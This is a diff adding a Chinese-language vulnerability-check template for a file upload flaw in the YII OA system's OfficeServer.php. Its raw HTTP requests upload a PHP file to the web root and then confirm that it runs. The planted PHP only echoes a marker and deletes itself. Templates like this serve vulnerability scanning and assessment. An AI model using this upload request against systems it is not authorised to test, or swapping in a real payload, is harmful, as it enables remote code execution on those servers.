@@ -1,0 +1,44 @@
+id: yii-oa-file-upload-2
+
+info:
+  name: "YII OA 系统 OfficeServer.php 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    YII OA 系统存在文件上传接口安全缺陷，攻击者可通过构造特定请求实现恶意文件上传，进而可能导致远程代码执行或敏感信息泄露。
+      漏洞日期：2024-01-15
+  tags: YII
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /static/lib/weboffice/js/OfficeServer.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----------398jnjVTTlDVXHlE7yYnfwBoix
+
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+    Content-Disposition: form-data; name="FormData"
+
+    {"OPTION":"SAVEFILE","FILEPATH":"/NTest.php"}
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+    Content-Disposition: form-data; name="FileData"; filename="NTest.php"
+    Content-Type: image/jpg
+
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------------398jnjVTTlDVXHlE7yYnfwBoix
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
